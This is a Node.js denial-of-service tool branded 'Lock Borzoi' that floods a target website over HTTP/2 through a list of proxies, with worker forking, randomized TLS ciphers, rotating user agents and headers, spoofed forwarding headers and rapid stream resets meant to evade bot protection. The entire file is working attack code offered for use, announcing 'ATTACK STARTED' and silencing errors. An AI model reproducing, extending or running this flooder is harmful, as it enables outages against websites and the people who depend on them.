const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');

//const errorHandler = error => {
//    console.log(error);
//};
//process.on("uncaughtException", errorHandler);
//process.on("unhandledRejection", errorHandler);

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
});

if (process.argv.length < 7) { console.log(`Lock Borzoi | usage lock borzoi: target time rate threads proxy.txt`); process.exit(); }
const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const ip_spoof = () => {
    const getRandomByte = () => {
        return Math.floor(Math.random() * 255);
    };
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

const ip_spoof2 = () => {
    const getRandomByte = () => {
        return Math.floor(Math.random() * 9999);
    };
    return `${getRandomByte()}`;
};

const spoofed2 = ip_spoof2();

const ip_spoof3 = () => {
    const getRandomByte = () => {
        return Math.floor(Math.random() * 118);
    };
    return `${getRandomByte()}`;
};

const spoofed3 = ip_spoof3();

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
}
const sig = [
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];
const sigalgs1 = sig.join(':');
const cplist = [
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256"
];
const val = {
    'NEl': JSON.stringify({
        "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
        "max-age": Math.random() < 0.5 ? 604800 : 2561000,
        "include_subdomains": Math.random() < 0.5 ? true : false
    }),
}
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
];
lang_header = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB',
    'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en-GB,en;q=0.5',
    'en-CA',
    'en-UK, en, de;q=0.5',
    'en-NZ',
    'en-GB,en;q=0.6',
    'en-ZA',
    'en-IN',
    'en-PH',
    'en-SG',
    'en-HK',
    'en-GB,en;q=0.8',
    'en-GB,en;q=0.9',
    ' en-GB,en;q=0.7',
    '*',
    'en-US,en;q=0.5',
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'utf-8, iso-8859-1;q=0.5, *;q=0.1',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-GB, en-US, en;q=0.9',
    'de-AT, de-DE;q=0.9, en;q=0.5',
    'cs;q=0.5',
    'da, en-gb;q=0.8, en;q=0.7',
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'tr',
    'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
];

const encoding_header = [
    '*',
    '*/*',
    'gzip',
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity',
    'gzip, deflate',
    'br',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip;q=1.0, identity; q=0.5, *;q=0',
    'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
    'compress;q=0.5, gzip;q=1.0',
    'identity',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'deflate',
];

const control_header = [
    'max-age=604800',
    'proxy-revalidate',
    'public, max-age=0',
    'max-age=315360000',
    'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
    's-maxage=604800',
    'max-stale',
    'public, immutable, max-age=31536000',
    'must-revalidate',
    'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'max-age=31536000,public,immutable',
    'max-age=31536000,public',
    'min-fresh',
    'private',
    'public',
    's-maxage',
    'no-cache',
    'no-cache, no-transform',
    'max-age=2592000',
    'no-store',
    'no-transform',
    'max-age=31557600',
    'stale-if-error',
    'only-if-cached',
    'max-age=0',
];

const uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
];
const platformd = [
    "Windows",
    "Linux",
    "Android",
    "iOS",
    "Mac OS",
    "iPadOS",
    "BlackBerry OS",
    "Firefox OS",
];
const rdom2 = [
    "pidor pidor",
    "kotak bas",
    "kotindi kis",
    "LOCK PIDORAS"
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var random = rdom2[Math.floor(Math.floor(Math.random() * rdom2.length))];
var platformx = platformd[Math.floor(Math.floor(Math.random() * platformd.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const rateHeaders = [
    //{ "A-IM": "Feed" },
    //{ "accept": accept },
    //{ "accept-charset": accept },
    //{ "accept-datetime": accept },
    //{ "viewport-height":"1080"  },
    //{ "viewport-width": "1920"  },
];

const rateHeaders2 = [
    //{ "Via": "1.1 " + parsedTarget.host },
    { "X-Requested-With": "XMLHttpRequest" },
    //{ "X-Forwarded-For": spoofed },
    { "X-Vercel-Cache": randstr(15) },
    //{ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=7200" },
    //{ "TK": "?" },
    { "X-Frame-Options": "deny" },
    { "X-ASP-NET": randstr(25) },
];
const rateHeaders3 = [
    { "cookie": randstr(15) },
    { "Expect": "100-continue" },
    { "Forwarded": "for=192.168.0.1;proto=http;by=" + spoofed },
    //{ "From": "user@gmail.com" },
    //{ "Max-Forwards": "10" },
    { "origin": "https://" + parsedTarget.host },
    { "pragma": "no-cache" },
    { "referer": "https://" + parsedTarget.host + "/" },
];
const rateHeaders4 = [
    { "accept-encoding": encoding },
    { "accept-language": lang },
    { "Refresh": "5" },
    { "X-Content-duration": spoofed },
    { "device-memory": "0.25" },
    { "HTTP2-Setting": Math.random() < 0.5 ? 'token64' : 'token68' },
    { "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
];
const rateHeaders5 = [
    //{ "upgrade-insecure-requests": "1" },
    //{ "Access-Control-Request-Method": "GET" },
    { "Cache-Control": "no-cache" },
    //{ "Content-Encoding": "gzip" },
    //{ "content-type": "text/html" },
];


if (cluster.isMaster) {
    console.log('Lock Borzoi -> ATTACK STARTED')
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else { setInterval(runFlooder) }

class NetSocket {
    constructor() { }

    async HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = await net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}
const path = parsedTarget.path.replace(/%RAND%/, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers["x-forwarded-proto"] = "https";
headers[":path"] = path;
headers[":scheme"] = "https";
headers["upgrade-insecure-requests"] = "1";

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 600000);

        const tlsOptions = {
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
            ecdhCurve: "X25519",
            ciphers: cipper,
            secureProtocol: "TLS_method",
            ALPNProtocols: ['h2'],
            //session: crypto.randomBytes(64),
            //timeout: 1000,
        };

        const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60000);

        const client = await http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 4096,
                maxConcurrentStreams: 100,
                initialWindowSize: Math.random() < 0.5 ? 65536 : 65535,
                maxHeaderListSize: 8192,
                maxFrameSize: Math.random() < 0.5 ? 16777215 : 16384,
                enablePush: false,
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 4096,
            maxConcurrentStreams: 100,
            initialWindowSize: Math.random() < 0.5 ? 65536 : 65535,
            maxHeaderListSize: 8192,
            maxFrameSize: Math.random() < 0.5 ? 16777215 : 16384,
            enablePush: false
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                    ...headers,
                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                    ...rateHeaders5[Math.floor(Math.random() * rateHeaders5.length)],
                    "user-agent":  uap1,
                    ...rateHeaders4[Math.floor(Math.random() * rateHeaders4.length)],
                    ...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
                    ...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
                };
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders)

                    client.on("response", response => {
                        request.rstStream(http2.constants.NGHTTP2_CANCEL);
                        request.write(random);
                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });
    }), function (error, response, body) {
    };
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);